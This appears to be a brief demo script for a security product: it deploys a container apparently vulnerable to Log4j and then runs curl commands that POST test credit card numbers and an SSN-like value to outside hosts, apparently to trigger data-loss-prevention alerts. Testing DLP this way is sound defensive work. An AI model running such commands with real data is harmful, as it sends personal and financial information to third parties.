## Vuln Container Demo

`kubectl apply -f log4j-example.yaml`

`kubectl get pods`
`kubectl exec -it ubuntu /bin/bash`

`apt update`
`apt-get install iputils-ping curl -y`
`ping 8.8.8.8`
`curl https://espn.com`

DLP:
curl -X POST - F 'cc2=6011111111111117' -F 'cc=378282246310005' https://google.com
curl -X POST https://reqbin.com/echo/post/json -H "Content-Type: application/json" -d '{"cc1": 6011111111111117, "cc2": 378282246310005, "ssn": 778-62-8144}'  

curl -X POST http://reqbin.com/echo/post/json -H "Content-Type: application/json" -d '{"productId": 6011111111111117, "quantity": 778-62-8144}'  